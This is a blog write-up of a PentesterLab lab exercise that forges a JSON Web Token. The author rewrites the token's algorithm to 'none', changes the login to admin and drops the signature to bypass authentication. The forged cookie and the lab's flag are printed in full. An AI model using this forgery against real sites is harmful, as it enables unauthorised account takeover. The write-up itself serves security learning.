---
title: JSON Web Token
date: "2017-06-14T22:40:32.169Z"
layout: post
path: "/pentesterlab/jwt"
category: "pentesterlab"
tile: "sm-tile"
color: "pentesterlab"
previewPicture: "white-badge.png"
previewPictureText: "White Badge"
readTime: "20"
hide: false
description: "Using the 'None' algorithm, I reverse a JWT cookie."
---

<div class='daily-hack-box'>
	<table class='table'>
		<thead>
		</thead>
		<tbody>
			<tr>
				<th scope='row'>Challenge</th>
				<td>Exploit the weakness of a JSON Web Token (JWT) in authentication in order to login successfully as admin.</td>
			</tr>
			<tr>
				<th scope='row'>Badge</th>
				<td>White Badge (1 of 6)</td>			
			</tr>
			<tr>
				<th scope='row'>Method</th>
				<td>JWT Weakness</td>
			</tr>
			<tr>
				<th scope='row'>Link</th>
				<td>
                    <a class='table-link' target='_blank' href='https://pentesterlab.com/exercises/jwt'>https://pentesterlab.com/exercises/jwt</a>
                </td>
			</tr>
			<tr>
				<th scope='row'>Flag</th>
				<td>
                b03de01a-3003-4f96-b2b0-e03534bd1c99
                </td>
			</tr>
			<tr>
				<th scope='row'>Sources</th>
				<td>
                <a class='table-link' target='_blank' href='https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/'>Critical vulnerabilities in JSON Web Token libraries</a>
                </td>
			</tr>
		</tbody>
	</table>
</div>

### Daily Hack #11 Writeup

First thing I did was create a user `root` with a password `toor` and login.  Next I opened my Chrome Web Tools and found my cookie with the command `document.cookie`.

```
"auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InJvb3QiLCJpYXQiOiIxNDk3NDg4Nzk5In0.ZDE4ZGVmODM0YWU5ZGQ2NzMzNjg3YjE4OTE3YmU0NzA5ZmVjMTk5N2JhNzIxZmU0MzkwYzk4OTZiMTYxYzcwMQ"
```

Now that I have the cookie, let's break it down.  The general pattern for JSON Web Tokens is as follows:

<div class='text-response'>
	Base64(Header).Base64(Data).Base64(Signature)
</div>


I'm super comfortable with dev tools and javascript, so let's just decode this there.

```javascript
document.cookie.replace('auth=','').split('.').forEach((ele) => {
   console.log(atob(ele));
});
```

Quick explanation for those not familiar with javascript.  The above script is removing the `auth=` portion of the cookie so it's just the Base64 portions.  Next it splits the string into three strings in an array on every period.  So we essentially now have `[Base64(Header), Base64(Data), Base64(Signature)]`.  Next, iterate over the array and use javascript's Base64 decoder `atob()` to decode each portion.  The result is:

```javascript
{"alg":"HS256","typ":"JWS"}
{"login":"root","iat":"1497488799"}
d18def834ae9dd6733687b18917be4709fec1997ba721fe4390c9896b161c701
```

<figure>
    <img style="height: 300px;" src="./decode-cookie.png" alt="Decoding the Cookie">
    <figcaption>Decoding the Cookie</figcaption>
</figure>


In 2015, Tim McLean reviewed JSON Web Token implementations and found critical vulnerabilities that allows an attack to bypass verification.  One such method, is using the `none` algorithm.  The `none` algorithm requires no signature, it is treated as a valid token.  Therefore, anyone can modify the cookie payload if they want.


Recall our current cookie structure, we need to modify it so it uses `None` instead of `HS256` and `admin` instead of `root`.  Also, if we use `None`, we don't need a signature so it's setup to an empty string.

```javascript
{"alg":"None","typ":"JWS"}
{"login":"admin","iat":"1497488799"}
""
```

We need to reverse these new parameters into a cookie.  I can't loop this in the console easily, so I just browse to http://www.asciitohex.com/ and paste each of the objects in the ASCII section 1 by 1.


```
{"alg":"None","typ":"JWS"}            =>   eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=
{"login":"admin","iat":"1497488799"}  =>   eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTQ5NzQ4ODc5OSJ9
```


Paired with the empty signature, I concatenate them into this cookie:

```bash
eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTQ5NzQ4ODc5OSJ9.
```



And using EditThisCookie, I paste new cookie into the browser and refresh the page!


<figure>
    <img style="height: 240px;" src="./jwt-solution.png" alt="JWT Solution">
    <figcaption>JSON Web Token Solution</figcaption>
</figure>

<br>

And I am now logged in as `admin` and the flag is displayed!

```
b03de01a-3003-4f96-b2b0-e03534bd1c99
```

<br>